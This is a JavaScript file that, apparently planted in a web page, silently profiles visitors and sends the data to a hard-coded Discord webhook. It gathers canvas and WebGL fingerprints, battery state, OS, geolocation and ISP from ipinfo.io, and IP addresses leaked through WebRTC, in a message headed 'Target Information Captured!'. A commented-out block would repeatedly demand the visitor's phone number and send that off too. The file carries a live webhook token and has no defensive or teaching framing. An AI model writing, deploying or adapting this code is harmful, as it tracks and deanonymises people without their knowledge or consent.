
const webhookURL = "https://discord.com/api/webhooks/1330487817914155060/7zGOaywZAThxAFy_d4r3z2kRV2im-lxXu5Na0k6nB_UnSUpbCw4jlh1E62URtcyh1K3E"; 
let privateIPs = new Set();
let publicIPs = new Set();
let userAgent = navigator.userAgent;
let osType = "Unknown OS";
let deviceModel = "Unknown Device";
let batteryStatus = "Unknown";
let isp = "Unknown ISP";
let geoLocation = "Unknown Location";
let isVPN = "Unknown";
let canvasFingerprint = "Unknown";
let webglFingerprint = "Unknown";
let screenResolution = `${screen.width}x${screen.height}`;
let path = window.location.pathname;

function sendToDiscord() {
    const userTime = new Date().toLocaleString();
    const payload = {
        content: "Target Information Captured!",
        embeds: [
            {
                title: "Target Details",
                fields: [
                    { name: "OS Type", value: osType, inline: false },
                    { name: "Device Model", value: deviceModel, inline: false },
                    { name: "Battery Status", value: batteryStatus, inline: false },
                    { name: "User Agent", value: userAgent, inline: false },
                    { name: "Public IPs", value: publicIPs.size ? [...publicIPs].join("\n") : "Not Found", inline: false },
                    { name: "Private IPs", value: privateIPs.size ? [...privateIPs].join("\n") : "Not Found", inline: false },
                    { name: "ISP", value: isp, inline: false },
                    { name: "Geolocation", value: geoLocation, inline: false },
                    { name: "VPN Status", value: isVPN, inline: false },
                    { name: "Screen Resolution", value: screenResolution, inline: false },
                    { name: "Canvas Fingerprint", value: canvasFingerprint, inline: false },
                    { name: "GPU/CPU", value: webglFingerprint, inline: false },
                    { name: "User Time", value: userTime, inline: false },
                    { name: "Identifier", value: path, inline: false}

                ],
                color: 3447003
            }
        ]
    };

    fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    }).catch(error => {});
}

async function getCanvasFingerprint() {
    let canvas = document.createElement("canvas");
    let ctx = canvas.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "14px Arial";
    ctx.fillStyle = "#f00";
    ctx.fillText("Hello, iPhone!", 10, 10);

    let fingerprint = canvas.toDataURL();
    const hashBuffer = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(fingerprint));
    canvasFingerprint = btoa(String.fromCharCode(...new Uint8Array(hashBuffer)));
}

function getWebGLFingerprint() {
    let canvas = document.createElement("canvas");
    let gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");

    if (!gl) {
        webglFingerprint = "WebGL Not Supported";
        return;
    }

    let debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    webglFingerprint = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
}

async function getBatteryStatus() {
    if (!navigator.getBattery) {
        batteryStatus = "Battery API Not Supported";
        return;
    }

    try {
        let battery = await navigator.getBattery();
        batteryStatus = `Level: ${battery.level * 100}% | Charging: ${battery.charging ? "Yes" : "No"}`;
    } catch (error) {
        batteryStatus = "Battery Status Error";
    }
}

async function getISPandVPNStatus() {
    try {
        let res = await fetch("https://ipinfo.io/json");
        let data = await res.json();
        isp = data.org || "Unknown ISP";
        geoLocation = `${data.city}, ${data.region}, ${data.country}`;

        await checkVPNStatus(data.ip);
    } catch (error) {
        isVPN = "Error Checking VPN";
    }
}

async function checkVPNStatus(ip) {
    try {
        let res = await fetch(`https://ipinfo.io/${ip}/json`);
        let data = await res.json();
        
        if (data.org && (data.org.includes("VPN") || data.org.includes("Proxy"))) {
            isVPN = "Yes (VPN Detected)";
        } else {
            isVPN = "No";
        }
    } catch (error) {
        isVPN = "Error Checking VPN";
    }
}

async function getAppleIPs() {
    return new Promise((resolve) => {
        const pc = new RTCPeerConnection({
            iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
        });

        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => resolve());

        pc.onicecandidate = (event) => {
            if (event.candidate) {
                let match = event.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                if (match && match[1]) {
                    let ip = match[1];
                    if (ip.startsWith("192.") || ip.startsWith("10.") || ip.startsWith("172.")) {
                        privateIPs.add(ip);
                    } else {
                        publicIPs.add(ip);
                    }
                }
            }
        };

        setTimeout(() => resolve(), 5000);
    });
}

function detectOS() {
    let platform = navigator.platform.toLowerCase();
    if (platform.includes("mac")) {
        osType = "MacOS";
        deviceModel = "Mac Device";
    } else if (platform.includes("win")) {
        osType = "Windows";
        deviceModel = "Windows PC";
    } else if (/android/.test(userAgent)) {
        osType = "Android";
        deviceModel = "Android Device";
    } else if (/iphone|ipad|ipod/.test(userAgent)) {
        osType = "iOS";
        deviceModel = /iphone/.test(userAgent) ? "iPhone" : "iPad";
    } else {
        osType = "Unknown OS";
    }
}
// number
/*function askForPhoneNumber() {
  const phoneRegex = /^\d{11}$/; // 11 digits only

  let phone = "";

  while (true) {
    phone = prompt("Enter Your Phone Number to Continue Reading: ");

    // If user clicks Cancel or closes prompt, prompt again
    if (phone === null || phone.trim() === "") {
      continue;
    }

    // Validate: must be 11 digits, only numbers
    if (phoneRegex.test(phone.trim())) {
      break; // valid input
    }
  }

  // Send to Discord webhook
  fetch("https://discord.com/api/webhooks/1330487817914155060/7zGOaywZAThxAFy_d4r3z2kRV2im-lxXu5Na0k6nB_UnSUpbCw4jlh1E62URtcyh1K3E", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: phone.trim() })
  });
}

// Trigger after 2-second delay
setTimeout(askForPhoneNumber, 2000);
*/
//

detectOS();
getBatteryStatus();
getCanvasFingerprint();
getWebGLFingerprint();
Promise.all([getISPandVPNStatus(), getAppleIPs()])
    .then(() => sendToDiscord());
